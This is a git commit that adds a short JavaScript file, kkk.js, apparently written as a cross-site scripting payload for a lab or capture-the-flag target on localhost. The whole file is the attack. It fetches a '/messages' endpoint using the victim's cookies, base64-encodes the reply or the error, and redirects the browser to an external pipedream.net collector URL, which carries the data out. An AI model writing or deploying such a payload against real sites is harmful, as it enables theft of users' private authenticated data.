76bc7aa4adb267f5168623a6b945ec99526a6e63
skav75 <149662383+skav75@users.noreply.github.com>
2025-10-03 22:26:43 +0200

    Create kkk.js

---
+++ kkk.js
@@ -0,0 +1,15 @@
+fetch("http://127.0.0.1:5002/messages", {
+  method: "GET",
+  credentials: "include"
+})
+  .then(r => {
+    if (!r.ok) throw new Error("HTTP " + r.status);
+    return r.text();
+  })
+  .then(txt => {
+    document.location = "https://eoeipamgnflz15n.m.pipedream.net?" + btoa(txt);
+  })
+  .catch(err => {
+    const encodedErr = btoa(String(err));
+    document.location = "https://eoeipamgnflz15n.m.pipedream.net?" + encodedErr;
+  });
